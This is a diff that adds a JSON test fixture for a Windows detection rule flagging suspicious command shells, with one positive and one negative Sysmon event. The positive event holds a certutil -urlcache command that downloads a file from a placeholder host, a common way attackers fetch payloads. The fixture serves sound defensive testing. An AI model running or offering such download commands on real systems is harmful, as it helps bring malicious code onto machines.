@@ -1,0 +1,21 @@
+{
+  "rule_id": "fusion-windows-suspicious-command-shell",
+  "positive": {
+    "event_id": 1,
+    "platform": "windows",
+    "source_type": "windows_sysmon",
+    "host_name": "WINDOWS-DETECTION-LAB",
+    "process_path": "C:\\Windows\\System32\\cmd.exe",
+    "process_name": "cmd.exe",
+    "command_line": "cmd.exe /c certutil -urlcache -f https://lab.invalid/test.bin test.bin"
+  },
+  "negative": {
+    "event_id": 1,
+    "platform": "windows",
+    "source_type": "windows_sysmon",
+    "host_name": "WINDOWS-DETECTION-LAB",
+    "process_path": "C:\\Windows\\System32\\cmd.exe",
+    "process_name": "cmd.exe",
+    "command_line": "cmd.exe /c certutil -urlcache FUSION-ALLOW-TEST"
+  }
+}
